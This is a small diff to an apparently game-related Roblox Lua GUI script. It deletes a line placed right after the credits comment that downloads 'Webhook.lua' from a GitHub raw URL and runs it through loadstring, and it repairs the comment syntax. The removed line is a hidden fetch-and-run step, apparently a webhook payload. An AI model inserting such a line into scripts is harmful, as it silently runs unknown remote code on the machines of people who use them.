@@ -2,8 +2,7 @@
   Creator: realgengar
   https/github/realgengar
   by:Rocks
-]]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/realgengar/Brookhaven/refs/heads/main/Webhook.lua"))()
+--]]
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local Button1 = Instance.new("TextButton")
